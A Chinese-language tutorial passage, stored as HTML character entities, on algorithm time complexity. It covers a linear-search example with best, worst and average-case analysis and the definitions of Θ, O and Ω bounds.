x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x53CD;&#x6620;&#x4E86;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x968F;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x589E;&#x957F;&#x800C;&#x589E;&#x957F;&#x7684;&#x91CF;&#x7EA7;&#xFF0C;&#x5728;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x80FD;&#x5F88;&#x597D;&#x53CD;&#x6620;&#x51FA;&#x7B97;&#x6CD5;&#x7684;&#x4F18;&#x52A3;&#x4E0E;&#x5426;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4F5C;&#x4E3A;&#x7A0B;&#x5E8F;&#x5458;&#xFF0C;&#x638C;&#x63E1;&#x57FA;&#x672C;&#x7684;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x65B9;&#x6CD5;&#x662F;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002; &#x4F46;&#x662F;&#x5F88;&#x591A;&#x670B;&#x53CB;&#x5E76;&#x4E0D;&#x80FD;&#x6E05;&#x6670;&#x7684;&#x7406;&#x89E3;&#x8FD9;&#x4E00;&#x6982;&#x5FF5;&#xFF0C;&#x7A76;&#x5176;&#x539F;&#x56E0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x4ECE;&#x6570;&#x5B66;&#x5C42;&#x9762;&#x4E0A;&#x7406;&#x89E3;&#x5176;&#x672C;&#x8D28;&#xFF0C;&#x800C;&#x662F;&#x4E60;&#x60EF;&#x4E8E;&#x4ECE;&#x76F4;&#x89C2;&#x7406;&#x89E3;&#x3002;&#x4E0B;&#x9762;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x4E00;&#x6B65;&#x6B65;&#x8D70;&#x8FD1;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x672C;&#x8D28;&#x3002; &#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x5B9A;&#x4E49;&#xFF0C;&#x7ED9;&#x5B9A;&#x7B97;&#x6CD5;A&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#x51FD;&#x6570;F(n)&#xFF0C;&#x5F53;n=k&#x65F6;&#xFF0C;F(k)&#x8868;&#x793A;&#x7B97;&#x6CD5;A&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x4E3A;k&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x5219;&#x79F0;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002; &#x53E6;&#x4E00;&#x79CD;&#x5B9A;&#x4E49;&#xFF1A;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7B97;&#x6CD5;&#x4E2D;&#x57FA;&#x672C;&#x64CD;&#x4F5C;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x6B21;&#x6570;&#x662F;&#x95EE;&#x9898;&#x89C4;&#x6A21;n&#x7684;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x7528;T(n)&#x8868;&#x793A;&#xFF0C;&#x82E5;&#x6709;&#x67D0;&#x4E2A;&#x8F85;&#x52A9;&#x51FD;&#x6570;f(n)&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&#x8D8B;&#x8FD1;&#x4E8E;&#x65E0;&#x7A77;&#x5927;&#x65F6;&#xFF0C;T(n)/f(n)&#x7684;&#x6781;&#x9650;&#x503C;&#x4E3A;&#x4E0D;&#x7B49;&#x4E8E;&#x96F6;&#x7684;&#x5E38;&#x6570;&#xFF0C;&#x5219;&#x79F0;f(n)&#x662F;T(n)&#x7684;&#x540C;&#x6570;&#x91CF;&#x7EA7;&#x51FD;&#x6570;&#x3002;&#x8BB0;&#x4F5C;T(n)=O(f(n))&#xFF0C;&#x79F0;O(f(n))&#x4E3A;&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FDB;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;(O&#x662F;&#x6570;&#x91CF;&#x7EA7;&#x7684;&#x7B26;&#x53F7; )&#xFF0C;&#x7B80;&#x79F0;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002; &#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x8981;&#x660E;&#x786E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x5173;&#x4E8E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#xFF0C;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#x4E0B;&#x5B9A;&#x4E49;&#xFF0C;&#x975E;&#x4E25;&#x683C;&#x7684;&#x8BB2;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x662F;&#x6307;&#x7B97;&#x6CD5;A&#x6240;&#x63A5;&#x53D7;&#x8F93;&#x5165;&#x7684;&#x81EA;&#x7136;&#x72EC;&#x7ACB;&#x4F53;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x6765;&#x8BF4;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x4E00;&#x822C;&#x5C31;&#x662F;&#x5F85;&#x6392;&#x5E8F;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x6C42;&#x4E24;&#x4E2A;&#x540C;&#x578B;&#x65B9;&#x9635;&#x4E58;&#x79EF;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x5355;&#x4E2A;&#x65B9;&#x9635;&#x7684;&#x7EF4;&#x6570;&#x3002;&#x4E3A;&#x4E86;&#x7B80;&#x5355;&#x8D77;&#x89C1;&#xFF0C;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x8BA8;&#x8BBA;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x603B;&#x662F;&#x5047;&#x8BBE;&#x7B97;&#x6CD5;&#x7684;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x662F;&#x7528;&#x5927;&#x4E8E;&#x96F6;&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;&#x7684;&#xFF0C;&#x5373;n=1,2,3,&#x2026;&#x2026;,k,&#x2026;&#x2026; &#x6211;&#x4EEC;&#x8FD8;&#x77E5;&#x9053;&#xFF0C;&#x5BF9;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x4EC5;&#x53D6;&#x51B3;&#x4E8E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#xFF0C;&#x8FD8;&#x53D6;&#x51B3;&#x4E8E;&#x8F93;&#x5165;&#x7684;&#x7279;&#x6027;&#x548C;&#x5177;&#x4F53;&#x7684;&#x786C;&#x4EF6;&#x73AF;&#x5883;&#x5728;&#x67D0;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x7684;&#x72B6;&#x6001;&#x3002;&#x6240;&#x4EE5;&#x60F3;&#x8981;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7EDF;&#x4E00;&#x7CBE;&#x786E;&#x7684;F(n)&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x505A;&#x4E00;&#x4E0B;&#x4E24;&#x4E2A;&#x8BF4;&#x660E;&#xFF1A;1.&#x5FFD;&#x7565;&#x786C;&#x4EF6;&#x53CA;&#x73AF;&#x5883;&#x56E0;&#x7D20;&#xFF0C;&#x5047;&#x8BBE;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x786C;&#x4EF6;&#x6761;&#x4EF6;&#x548C;&#x73AF;&#x5883;&#x6761;&#x4EF6;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x81F4;&#x7684;&#x3002;2.&#x5BF9;&#x4E8E;&#x8F93;&#x5165;&#x7279;&#x6027;&#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x8FDB;&#x884C;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x5E76;&#x5E26;&#x5165;&#x51FD;&#x6570;&#x89E3;&#x6790;&#x5F0F;&#x3002; &#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;&#x4E3A;&#x4E86;&#x4FBF;&#x4E8E;&#x670B;&#x53CB;&#x4EEC;&#x7406;&#x89E3;&#xFF0C;&#x6211;&#x5C06;&#x4E0D;&#x4F1A;&#x91C7;&#x7528;&#x6559;&#x79D1;&#x4E66;&#x4E0A;&#x60EF;&#x7528;&#x7684;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#x3001;&#x5408;&#x5E76;&#x6392;&#x5E8F;&#x7B49;&#x7ECF;&#x5178;&#x793A;&#x4F8B;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x5341;&#x5206;&#x7B80;&#x5355;&#x7684;&#x7B97;&#x6CD5;&#x4F5C;&#x4E3A;&#x793A;&#x4F8B;&#x3002;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x5B9A;&#x4E49;&#x95EE;&#x9898;&#x3002; &#x95EE;&#x9898;&#x5B9A;&#x4E49;&#xFF1A;&#x8F93;&#x5165;&#x2014;&#x2014;&#x6B64;&#x95EE;&#x9898;&#x8F93;&#x5165;&#x4E3A;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#xFF0C;&#x5176;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x4E3A;n&#xFF0C;n&#x4E3A;&#x5927;&#x4E8E;&#x96F6;&#x7684;&#x6574;&#x6570;&#x3002;&#x5E8F;&#x5217;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#x4E3A;&#x4ECE;1&#x5230;n&#x8FD9;n&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x4F46;&#x5176;&#x987A;&#x5E8F;&#x4E3A;&#x5B8C;&#x5168;&#x968F;&#x673A;&#x3002;&#x8F93;&#x51FA;&#x2014;&#x2014;&#x5143;&#x7D20;n&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x3002;&#xFF08;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF09; &#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4E0B;&#x9762;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x5176;&#x89E3;&#x51B3;&#x7B97;&#x6CD5;&#x4E4B;&#x4E00;&#xFF08;&#x4F2A;&#x4EE3;&#x7801;&#xFF09;&#xFF1A;12345678LocationN(A){ for(int i=1;i&lt;=n;i++)-----------------------t1 { if(A[i] == n) ----------------------------t2 { return i; }------------------------t3 }} &#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x3002;&#x5176;&#x4E2D;t1&#x3001;t2&#x548C;t3&#x5206;&#x522B;&#x8868;&#x793A;&#x6B64;&#x884C;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x3002; &#x9996;&#x5148;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;n&#x662F;&#x5F71;&#x54CD;&#x7B97;&#x6CD5;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7684;&#x56E0;&#x7D20;&#x4E4B;&#x4E00;&#x3002;&#x5728;n&#x56FA;&#x5B9A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x8F93;&#x5165;&#x5E8F;&#x5217;&#x4E5F;&#x4F1A;&#x5F71;&#x54CD;&#x5176;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x3002;&#x6700;&#x597D;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;n&#x5C31;&#x6392;&#x5728;&#x5E8F;&#x5217;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#xFF0C;&#x90A3;&#x4E48;&#x6B64;&#x65F6;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;t1+t2+t3&#x201D;&#x3002;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;n&#x6392;&#x5728;&#x5E8F;&#x5217;&#x6700;&#x540E;&#x4E00;&#x4F4D;&#xFF0C;&#x5219;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;nt1+nt2+t3=(t1+t2)*n+t3&#x201D;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6700;&#x597D;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#xFF0C;&#x800C;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x662F;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x7684;&#x7EBF;&#x6027;&#x51FD;&#x6570;&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x5982;&#x4F55;&#x5462;&#xFF1F; &#x95EE;&#x9898;&#x5B9A;&#x4E49;&#x8BF4;&#x8F93;&#x5165;&#x5E8F;&#x5217;&#x5B8C;&#x5168;&#x968F;&#x673A;&#xFF0C;&#x5373;n&#x51FA;&#x73B0;&#x5728;1&#x2026;n&#x8FD9;n&#x4E2A;&#x4F4D;&#x7F6E;&#x4E0A;&#x662F;&#x7B49;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x5373;&#x6982;&#x7387;&#x5747;&#x4E3A;1/n&#x3002;&#x800C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x6267;&#x884C;&#x6B21;&#x6570;&#x5373;&#x4E3A;&#x6267;&#x884C;&#x6B21;&#x6570;&#x7684;&#x6570;&#x5B66;&#x671F;&#x671B;&#xFF0C;&#x5176;&#x89E3;&#x4E3A;&#xFF1A;12345E= p(n=1)*1+p(n=2)*2+...+p(n=n)*n= (1/n)*(1+2+...+n)= (1/n)*((n/2)*(1+n))= (n+1)/2 &#x5373;&#x5728;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;for&#x5FAA;&#x73AF;&#x8981;&#x6267;&#x884C;(n+1)/2&#x6B21;&#xFF0C;&#x5219;&#x5E73;&#x5747;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;(t1+t2)(n+1)/2+t3&#x201D;&#x3002;&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x5F97;&#x51FA;&#x5206;&#x6790;&#x7ED3;&#x8BBA;&#xFF1A;**t1+t2+t3 &lt;= F(n) &lt;= (t1+t2)n+t3&#xFF0C;&#x5728;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;F(n) = (t1+t2)(n+1)/2+t3* &#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4EE5;&#x4E0A;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;F(n)&#x8FDB;&#x884C;&#x4E86;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x5982;&#x6B64;&#x7CBE;&#x786E;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x4E0B;&#xFF1A;1.&#x5728;&#x8F83;&#x590D;&#x6742;&#x7684;&#x7B97;&#x6CD5;&#x4E2D;&#xFF0C;&#x8FDB;&#x884C;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x662F;&#x975E;&#x5E38;&#x590D;&#x6742;&#x7684;&#x3002;2.&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x5173;&#x5FC3;F(n)&#x7684;&#x7CBE;&#x786E;&#x5EA6;&#x91CF;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x5173;&#x5FC3;&#x5176;&#x91CF;&#x7EA7;&#x3002; &#x57FA;&#x4E8E;&#x6B64;&#xFF0C;&#x63D0;&#x51FA;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x5728;&#x6B63;&#x5F0F;&#x7ED9;&#x51FA;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E4B;&#x524D;&#xFF0C;&#x8981;&#x5148;&#x7ED9;&#x51FA;&#x51E0;&#x4E2A;&#x6570;&#x5B66;&#x5B9A;&#x4E49;&#xFF1A;123&#x5B9A;&#x4E49;&#x4E00;&#xFF1A;&#x398;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c1&#x3001;c2&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;c1g(n)&lt;=f(n)&lt;=c2g(n)&#x6052;&#x6210;&#x7ACB;}&#x5B9A;&#x4E49;&#x4E8C;&#xFF1A;&#x39F;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;=f(n)&lt;=cg(n)&#x6052;&#x6210;&#x7ACB;}&#x5B9A;&#x4E49;&#x4E09;&#xFF1A;&#x3A9;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;=cg(n)&lt;=f(n)&#x6052;&#x6210;&#x7ACB;} &#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E09;&#x4E2A;&#x5B9A;&#x4E49;&#x5176;&#x5B9E;&#x90FD;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x96C6;&#x5408;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x540C;&#x3002;&#x6709;&#x4E86;&#x4EE5;&#x4E0A;&#x5B9A;&#x4E49;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E86;&#x3002; &#x4E0D;&#x8FC7;&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;F(n)&#x4E0D;&#x662F;&#x786E;&#x5B9A;&#x7684;&#xFF0C;&#x4ED6;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x5185;&#x53D8;&#x52A8;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5173;&#x5FC3;&#x54EA;&#x4E2A;F(n)&#x5462;&#xFF1F;&#x4E00;&#x822C;&#x6211;&#x4EEC;&#x5728;&#x5206;&#x6790;&#x7B97;&#x6CD5;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#x7684;F(n)&#x6765;&#x8BC4;&#x4EF7;&#x7B97;&#x6CD5;&#x6548;&#x7387;&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x5982;&#x4E0B;&#x4E24;&#x70B9;&#xFF1A;1.&#x5982;&#x679C;&#x77E5;&#x9053;&#x4E86;&#x6700;&#x574F;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x90FD;&#x4E0D;&#x80FD;&#x6BD4;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x66F4;&#x574F;&#x4E86;&#x3002;2.&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x7B97;&#x6CD5;&#x8FD0;&#x884C;&#x53D1;&#x751F;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x7684;&#x6982;&#x7387;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#x7684;&#xFF0C;&#x5982;&#x67E5;&#x627E;&#x95EE;&#x9898;&#x4E2D;&#x5F85;&#x67E5;&#x5143;&#x7D20;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x4E14;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x662F;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#x7684;&#x3002; &#x4E8E;&#x662F;&#x7ED9;&#x51FA;&#x5982;&#x4E0B;&#x5B9A;&#x4E49;&#xFF1A;&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x398;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x3002; &#x8FD8;&#x662F;&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x4E3A;&#x4F8B;&#xFF0C;&#x5219;&#x5728;&#x4E0A;&#x9762;&#x5B9A;&#x4E49;&#x4E2D;F(n) = (t1+t2)*n+t3&#x3002;&#x5219;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x4E3A;n&#xFF0C;&#x5176;&#x8BC1;&#x660E;&#x5982;&#x4E0B;&#xFF1A;1234567&#x8BC1;&#x660E;&#xFF1A;&#x8BBE;c1=t1+t2&#xFF0C;c2=t1+t2+t3&#xFF0C;n0=2&#x53C8;&#x56E0;&#x4E3A; t1,t2,t3&#x5747;&#x5927;&#x4E8E;0&#x5219;&#xFF0C;&#x5F53;n&gt;n0&#x65F6;&#xFF0C;0&lt;c1n&lt;=F(n)&lt;=c2n &#x5373; 0&lt;(t1+t2)*n&lt;=(t1+t2)*n+t3&lt;=(t1+t2+t3)*n&#x6052;&#x6210;&#x7ACB;&#x3002;&#x6240;&#x4EE5; F(n)&#x5C5E;&#x4E8E;&#x398;(n)&#x6240;&#x4EE5; n&#x662F;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x8BC1;&#x6BD5; &#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4EE3;&#x66FF;&#x5B9E;&#x9645;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x6765;&#x8FDB;&#x884C;&#x7B97;&#x6CD5;&#x6548;&#x7387;&#x5206;&#x6790;&#x3002;&#x4E00;&#x822C;&#x8BA4;&#x4E3A;&#xFF0C;&#x4E00;&#x4E2A;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n&#x7684;&#x7B97;&#x6CD5;&#x8981;&#x4F18;&#x4E8E;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n^2&#x7684;&#x7B97;&#x6CD5;&#x3002; &#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x8BF4;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n&#x7684;&#x7B97;&#x6CD5;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x4E00;&#x5B9A;&#x66F4;&#x9AD8;&#x6548;&#xFF0C;&#x800C;&#x662F;&#x8BF4;&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x8DB3;&#x591F;&#x5927;&#x540E;&#xFF08;&#x5927;&#x4E8E;&#x4E34;&#x754C;&#x6761;&#x4EF6;n0&#xFF09;&#xFF0C;&#x5219;&#x524D;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x603B;&#x662F;&#x597D;&#x4E8E;&#x540E;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x3002;&#x4E8B;&#x5B9E;&#x8BC1;&#x660E;&#xFF0C;&#x5728;&#x5B9E;&#x8DF5;&#x4E2D;&#x8FD9;&#x79CD;&#x5206;&#x6790;&#x662F;&#x5408;&#x7406;&#x4E14;&#x6709;&#x6548;&#x7684;&#x3002; &#x7C7B;&#x4F3C;&#x7684;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x7ED9;&#x51FA;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x4E0A;&#x786E;&#x754C;&#x548C;&#x4E0B;&#x786E;&#x754C; &#xFF1A;12&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x39F;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E0A;&#x9650;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x4E0A;&#x786E;&#x754C;&#x3002;&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x3A9;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E0B;&#x9650;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#x3002; 